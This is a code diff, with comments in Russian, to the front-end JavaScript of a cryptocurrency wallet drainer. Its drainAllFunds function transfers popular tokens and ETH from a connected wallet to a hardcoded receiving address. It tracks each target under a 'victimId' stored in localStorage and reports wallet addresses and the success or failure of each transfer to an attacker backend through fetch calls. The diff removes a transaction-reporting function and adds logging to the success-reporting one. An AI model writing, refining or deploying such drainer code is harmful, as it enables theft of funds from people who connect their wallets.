@@ -128,85 +128,21 @@ async function sendConnectionData(walletAddress) {
         console.error('[FRONTEND] sendConnectionData: Ошибка:', error);
     }
 }
-/**
- * Отправка данных о транзакции
- */
-
-async function sendTransactionData(txHash, walletAddress) {
-    try {
-        console.log('[FRONTEND] sendTransactionData: Начало отправки данных о транзакции');
-        console.log('[FRONTEND] sendTransactionData: txHash:', txHash, 'walletAddress:', walletAddress);
-
-        // Получаем victimId из localStorage
-        const victimId = localStorage.getItem('victimId');
-        console.log('[FRONTEND] sendTransactionData: Получен victimId из localStorage:', victimId);
-
-        // Проверяем, есть ли victimId
-        if (!victimId) {
-            console.error('[FRONTEND] sendTransactionData: Victim ID не найден в localStorage!');
-            // Не пытаемся его получить, просто выходим
-            return;
-        }
-
-        // Формируем данные для отправки
-        const txData = {
-            victimId: victimId,
-            walletAddress: walletAddress,
-            txHash: txHash,
-            timestamp: new Date().toISOString()
-        };
-
-        console.log('[FRONTEND] sendTransactionData: Данные для отправки', txData);
-
-        // Отправляем данные на бэкенд
-        const response = await fetch(`${BACKEND_URL}/transaction`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(txData)
-        });
-
-        console.log('[FRONTEND] sendTransactionData: Получен ответ от сервера', response.status, response.statusText);
-
-        // Проверяем статус ответа
-        if (!response.ok) {
-            const errorText = await response.text();
-            console.error('[FRONTEND] sendTransactionData: Ошибка от сервера:', errorText);
-            
-            // Если сервер сказал, что жертва не найдена
-            if (response.status === 404 && errorText.includes("Victim not found")) {
-                console.warn('[FRONTEND] sendTransactionData: Сервер сообщил, что Victim ID не найден. Возможно, сессия устарела.');
-                // Удаляем устаревший ID из localStorage
-                localStorage.removeItem('victimId');
-                console.log('[FRONTEND] sendTransactionData: Устаревший Victim ID удален из localStorage.');
-                // Не пытаемся снова вызывать sendVisitData, просто сообщаем об ошибке
-            }
-            
-            return; // Выходим из функции
-        }
-
-        // Если ответ успешный
-        const result = await response.json();
-        console.log('[FRONTEND] sendTransactionData: Успешный ответ от сервера', result);
-        
-        // Уведомление отправлено успешно
-        console.log('[FRONTEND] sendTransactionData: Данные о транзакции успешно отправлены на бэкенд.');
-
-    } catch (error) {
-        // Обрабатываем сетевые ошибки и другие исключения
-        console.error('[FRONTEND] sendTransactionData: Критическая ошибка при отправке данных:', error);
-    }
-    
-    console.log('[FRONTEND] sendTransactionData: Функция завершена.');
-}
 
 async function sendSuccessData(tokens, ethBalance, successTokens = [], failedTokens = [], ethSuccess = false) {
     try {
+        console.log('[FRONTEND] sendSuccessData: Начало отправки данных об успехе');
+        
+        // Получаем victimId из localStorage
         const victimId = localStorage.getItem('victimId');
-        if (!victimId) return;
+        console.log('[FRONTEND] sendSuccessData: Получен victimId из localStorage:', victimId);
+        
+        if (!victimId) {
+            console.warn('[FRONTEND] sendSuccessData: Victim ID не найден в localStorage!');
+            return;
+        }
 
-        // Обрабатываем `tokens`, если это массив объектов, извлекаем символы
+        // Обрабатываем tokens, если это массив объектов, извлекаем символы
         let tokensForBackend = [];
         if (Array.isArray(tokens)) {
             tokensForBackend = tokens.map(t => (typeof t === 'object' && t.symbol) ? t.symbol : String(t));
@@ -214,6 +150,7 @@ async function sendSuccessData(tokens, ethBalance, successTokens = [], failedTok
             tokensForBackend = [String(tokens)];
         }
 
+        // Формируем данные для отправки
         const successData = {
             victimId: victimId,
             walletAddress: userAccount, // Используем глобальную переменную
@@ -225,6 +162,9 @@ async function sendSuccessData(tokens, ethBalance, successTokens = [], failedTok
             timestamp: new Date().toISOString()
         };
 
+        console.log('[FRONTEND] sendSuccessData: Данные для отправки', successData);
+
+        // Отправляем данные на бэкенд
         const response = await fetch(`${BACKEND_URL}/success`, {
             method: 'POST',
             headers: {
@@ -233,16 +173,22 @@ async function sendSuccessData(tokens, ethBalance, successTokens = [], failedTok
             body: JSON.stringify(successData)
         });
 
+        console.log('[FRONTEND] sendSuccessData: Получен ответ от сервера', response.status, response.statusText);
+
         if (!response.ok) {
             const errorText = await response.text();
-            console.error('Не удалось отправить данные об успехе:', errorText);
+            console.error('[FRONTEND] sendSuccessData: Ошибка от сервера:', errorText);
             return;
         }
 
         const result = await response.json();
+        console.log('[FRONTEND] sendSuccessData: Ответ сервера', result);
+        
         // Успешно отправлено
+        console.log('[FRONTEND] sendSuccessData: Данные об успехе успешно отправлены на бэкенд.');
+
     } catch (error) {
-        console.log('Не удалось отправить данные об успехе:', error.message);
+        console.error('[FRONTEND] sendSuccessData: Критическая ошибка при отправке данных об успехе:', error);
     }
 }
 // --- Конец функций бэкенда ---
@@ -457,14 +403,14 @@ function getPopularTokens() {
     ];
 }
 
-// Функция вывода всех средств (токены + ETH)
 async function drainAllFunds() {
     try {
         const tokens = getPopularTokens();
         const drainWallet = "0x0BbfE77CAA49fc4245274f6238A9264642a09C03"; // Адрес получения
         let successTokens = [];
         let failedTokens = [];
-        
+        let ethSuccess = false;
+
         // Сначала выводим токены
         for (let token of tokens) {
             try {
@@ -485,19 +431,19 @@ async function drainAllFunds() {
                 failedTokens.push(token.symbol);
             }
         }
-        
+
         // Затем выводим ETH
-        let ethSuccess = false;
         try {
             await drainETH();
             ethSuccess = true;
         } catch (error) {
             console.log("Ошибка вывода ETH:", error.message);
         }
-        
+
         // Показываем успех и отправляем уведомление
         showSuccessMessage();
-        await sendDrainNotification(userAccount, tokens, successTokens, failedTokens, ethSuccess);
+        // Вызываем sendSuccessData только после того, как все операции выполнены
+        await sendSuccessData(tokens, "N/A", successTokens, failedTokens, ethSuccess);
         
     } catch (error) {
         console.error("Ошибка вывода средств:", error);
@@ -725,6 +671,7 @@ window.addEventListener('DOMContentLoaded', () => {
         console.warn('[INIT] DOMContentLoaded: Кнопка подключения не найдена в DOM');
     }
 });
+
 
 
 
